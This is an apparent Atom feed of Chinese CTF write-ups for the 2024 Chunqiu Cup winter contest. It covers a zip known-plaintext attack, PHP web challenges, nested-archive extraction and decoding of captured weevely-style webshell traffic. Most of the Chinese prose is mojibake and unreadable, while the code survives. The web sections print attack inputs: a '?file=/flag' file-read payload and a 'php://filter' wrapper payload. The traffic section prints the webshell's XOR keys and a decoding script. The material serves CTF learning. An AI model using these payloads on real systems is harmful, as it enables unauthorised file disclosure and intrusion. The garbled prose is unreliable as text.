Deflateæ–¹å¼åŠ å¯†çš„</p><p>æ‰€ä»¥è§£å¯†åæ³¨æ„å¾—åˆ°çš„out.pngæ˜¯deflateçš„æ•°æ®æµï¼Œéœ€è¦ä½¿ç”¨pythonè„šæœ¬è¿›è¡Œè§£ç </p><p>åœ¨rbkcrackçš„toolsé‡Œæ‰¾åˆ°è¿™ä¸ªè„šæœ¬</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>è‡³æ­¤å¤§åŠŸå‘Šæˆï¼ŒæˆåŠŸæå–åˆ°å‹ç¼©æ–‡ä»¶é‡Œçš„LP.png</p>]]></content>
    
    
    <summary type="html">ğŸ¥§ä¸¤ç§æ˜æ–‡æ”»å‡»</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="miscå§¿åŠ¿" scheme="https://blog.m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.19</title>
    <link href="https://blog.m3x1.cn/posts/55fde2b7.html"/>
    <id>https://blog.m3x1.cn/posts/55fde2b7.html</id>
    <published>2025-01-18T16:00:00.000Z</published>
    <updated>2025-01-22T06:51:48.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-php">easy_php</h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼Œæˆªæ–­ï¼Œæºç å®¡è®¡</p></blockquote><p>æ‰“å¼€ç½‘ç«™åï¼Œå¯ä»¥ä¸‹è½½æºç ï¼Œå…ˆä¸‹è½½æºç ï¼Œç„¶åå†æ‰«ä¸€ä¸‹ç½‘ç«™ç›®å½•</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>é…åˆæºç å®¡è®¡ï¼Œå®¡è®¡è¿‡ç¨‹çœç•¥ã€‚å…¶ä¸­åœ¨æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸‹å·²ç»æœ‰æ–‡ä»¶äº†ï¼Œå†ç»“åˆæç¤ºå¯ä»¥çŸ¥é“ï¼Œä¸ç”¨å†è‡ªå·±ä¸Šä¼ æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>é‚£ä¹ˆå°±éœ€è¦è§¦å‘æ–‡ä»¶ï¼Œçœ‹è¿™é‡Œä»£ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>å¯ä»¥çŸ¥é“åœ¨/file.phpé¡µé¢ä¸­å¯ä»¥è¿›è¡Œurlçš„getä¼ å‚ï¼Œç„¶åä¼šå°†å‚æ•°å€¼è¿‡æ»¤åè¿›è¡Œé«˜äº®ï¼Œè§¦å‘ååºåˆ—åŒ–é“¾ã€‚</p><p>ä½†æ˜¯è¿™é‡Œçš„è¿‡æ»¤ä¸­ï¼Œæ˜¯f1agè€Œä¸æ˜¯flagï¼Œæ‰€ä»¥å…¶å®æ²¡æœ‰è¿‡æ»¤flagå…³é”®è¯ã€‚</p><p>å› æ­¤ç»“åˆæºç ï¼Œç›´æ¥æ„é€ payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code">easy_code</h4><blockquote><p>è€ƒç‚¹ï¼šåˆ©ç”¨PHPç‰¹æ€§ç»•è¿‡ï¼Œfilterä¼ªåè®®</p></blockquote><p>è®¿é—®/robots.txt å¯ä»¥çœ‹åˆ°æœ‰ gogogo.php</p><p>ctfer å‚æ•°æœ‰ä¸‰ä¸ªæ£€æµ‹ï¼Œåªéœ€è¦ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼ŒPHP ä¼šè‡ªåŠ¨å››èˆäº”å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar é‡Œè®¾ç½® cookie ä¸º pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024æ˜¥ç§‹æ¯å†¬å­£èµ›ä¸‰æ—¥Writeupæ±‡æ€»(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include é‚£é‡Œä½¿ç”¨ php://filter é…åˆ convert.iconv ä¿®æ”¹å­—ç¬¦é›†ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="éŸ³é¢‘çš„ç§˜å¯†">éŸ³é¢‘çš„ç§˜å¯†</h4><blockquote><p>è€ƒç‚¹ï¼šçŸ¥é“éƒ¨åˆ†æ˜æ–‡ç ´è§£å‹ç¼©åŒ…</p></blockquote><p>ä¸‹è½½é™„ä»¶è§£å‹ï¼Œæ˜¯ä¸€ä¸ªwavæ–‡ä»¶ï¼Œæ ¹æ®æç¤ºçŸ¥é“ï¼Œæ˜¯deepsoundåŠ å¯†ï¼Œä¸”å¯†ç ä¸ºå¼±å£ä»¤ã€‚</p><p>ç”¨deepsoundè§£å¯†ï¼Œå¼±å£ä»¤å¯†ç ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæœ€åå¯†ç ä¸º123ï¼Œå¾—åˆ°ä¸€ä¸ªflag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>æå–å‡ºæ¥ï¼Œå‘ç°éœ€è¦å¯†ç ï¼Œå‹ç¼©åŒ…å†…æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚</p><p>ç”¨å„ç§å·¥å…·çˆ†ç ´ï¼Œå‘ç°é•¿æ—¶é—´éƒ½æ²¡çˆ†ç ´å‡ºæ¥ï¼Œæœ€åèµ›åå¤ç°ï¼Œçœ‹åˆ«äººwpæ‰çŸ¥é“ï¼Œæ˜æ–‡åŠ å¯†é™¤äº†ä½¿ç”¨å®Œæ•´æ˜æ–‡æ–‡ä»¶å¤–ï¼Œä¹Ÿæœ‰ä¸€ç§ä½¿ç”¨ä¸€éƒ¨åˆ†æ˜æ–‡æ–‡ä»¶çš„çˆ†ç ´æ–¹å¼ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>å¾—åˆ°ä¸€å¼ pngå›¾ç‰‡ï¼Œåœ¨rgbå¤„å‘ç°flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity">Infinity</h4><blockquote><p>è€ƒç‚¹ï¼šå¥—å¨ƒå‹ç¼©åŒ…ï¼Œè§£ç </p></blockquote><p>ä¸‹è½½å‹ç¼©åŒ…è§£å‹ï¼Œé‡Œé¢æ˜¯å¼ pngå›¾ç‰‡ï¼Œæ”¾è¿›010editoræŸ¥çœ‹ï¼Œå‘ç°æœ‰åµŒå¥—æ–‡ä»¶ã€‚</p><p>è¿›è¡Œæ–‡ä»¶åˆ†ç¦»ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>å‹ç¼©åŒ…é‡Œæœ‰zip,tar,7zä¸‰ç§ï¼Œä¸”å‹ç¼©åŒ…åå­—æ„Ÿè§‰åƒæ˜¯æŸç§ç¼–ç ã€‚</p><p>å†™è„šæœ¬ç›´æ¥è§£å‹å¹¶è®°ä¸‹æ–‡ä»¶åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\æ–°å»ºæ–‡ä»¶å¤¹ (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>è§£å‹åå¾—åˆ°ä¸€ä¸ªSeCr3t.txtï¼Œæ–‡ä»¶å†…å®¹æ˜¯Inf1nityIsS0CoOLã€‚</p><p>ç”¨è„šæœ¬å¯¹è¿™äº›å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œå‘ç°åœ¨é€†åºçš„æ—¶å€™èƒ½æ ¹æ®æç¤ºè¿›è¡Œè§£ç ã€‚å³ä»£ç ä¸­çš„ç¬¬äºŒä¸ªprintã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#æ–‡æœ¬ä¹‹ä¸­æ¯è¡Œæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #å°†æ¯è¡Œå­—ç¬¦ä¸²é¡ºåºè¿æ¥èµ·æ¥</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #å°†æ¯è¡Œå­—ç¬¦ä¸²é€†åºè¿æ¥èµ·æ¥</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #å°†æ¯è¡Œå­—ç¬¦ä¸²åè½¬åé¡ºåºè¿æ¥èµ·æ¥</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #å°†æ¯è¡Œå­—ç¬¦ä¸²åè½¬åå†é€†åºè¿æ¥èµ·æ¥</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºçŸ¥é“ï¼Œæ˜¯BASE58-Ripple<code>+</code>SM4-ECBï¼Œsm4ä¸­çš„keyæ”¹ä¸ºä¸Šè¿°æ–‡ä»¶å†…å®¹ï¼Œå¾—åˆ°ä¸€å¼ æ¡å½¢ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>ç”±äºä¸‹è½½ä¸‹æ¥çš„å›¾ç‰‡æ˜¯å¾ˆæš—çš„ï¼Œå¾ˆéš¾ç›´æ¥è¯†åˆ«ï¼Œæ‰€ä»¥è¦å…ˆåŠ ç™½åº•ã€‚ç®€ä¾¿æ–¹æ³•å°±iæ˜¯ç›´æ¥é¢„è§ˆåŠ æˆªå›¾ä¿å­˜ï¼Œç„¶åæ‰«ææˆªå›¾ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.19</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.18</title>
    <link href="https://blog.m3x1.cn/posts/22fad221.html"/>
    <id>https://blog.m3x1.cn/posts/22fad221.html</id>
    <published>2025-01-17T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.837Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Weevilâ€™s-Whisper">Weevilâ€™s Whisper</h4><blockquote><p>è€ƒç‚¹ï¼šæµé‡åˆ†æï¼Œä»£ç å®¡è®¡</p></blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œè¿›è¡Œæµé‡åˆ†æï¼Œçœ‹åˆ°ä¸Šä¼ çš„ä»£ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118152835441.png" alt="image-20250118152835441"></p><p>è¿›è¡Œä»£ç å®¡è®¡å¯ä»¥çŸ¥é“ï¼Œåœ¨httpä¸­çš„è¿”å›ç»“æœæ˜¯ç”±$p$kh$r$kfç»„æˆçš„ï¼Œè€Œ$p,$kh,$kfæ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥æå–å‡ºæ¥$rã€‚</p><p>å†çœ‹ä»£ç ï¼Œ$ræ˜¯$oè¿›è¡Œä¸€ç³»åˆ—åŠ å¯†è€Œæˆï¼Œè€Œ$oå°±æ˜¯æ‰§è¡Œå®Œæˆåè¿”å›çš„ç»“æœï¼Œæ‰€ä»¥åªéœ€è¦å†™è„šæœ¬åè§£$rå°±èƒ½å‡ºç°ç»“æœã€‚</p><p>exp:</p><p>æå–$rçš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹å­—ç¬¦ä¸²åˆ—è¡¨</span><br><span class="line">strings = [</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUFRXAGExNS5kaQ==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUVRSBofUNDFgR2Uu4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6KU+uuy3+Gn+oqy3SgTM2GBxmng==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼</span><br><span class="line">pattern = re.compile(r&#x27;lFDu8RwONqmag5ex45089b3446ee(.*?)4e0d86dbcf92&#x27;)</span><br><span class="line"></span><br><span class="line"># æå–å¹¶æ‰“å°ç»“æœ</span><br><span class="line">for string in strings:</span><br><span class="line">    match = pattern.search(string)</span><br><span class="line">    if match:</span><br><span class="line">        extracted_string = match.group(1)</span><br><span class="line">        print(f&quot;Extracted: &#123;extracted_string&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;No match found in: &#123;string&#125;&quot;)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>åè§£$rçš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$k=&quot;161ebd7d&quot;;$kh=&quot;45089b3446ee&quot;;$kf=&quot;4e0d86dbcf92&quot;;$p=&quot;lFDu8RwONqmag5ex&quot;;</span><br><span class="line">function x($t,$k)&#123;</span><br><span class="line">  $c=strlen($k);$l=strlen($t);$o=&quot;&quot;;</span><br><span class="line">  for($i=0;$i&lt;$l;)&#123;</span><br><span class="line">    for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $o.=$t[$i]^$k[$j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 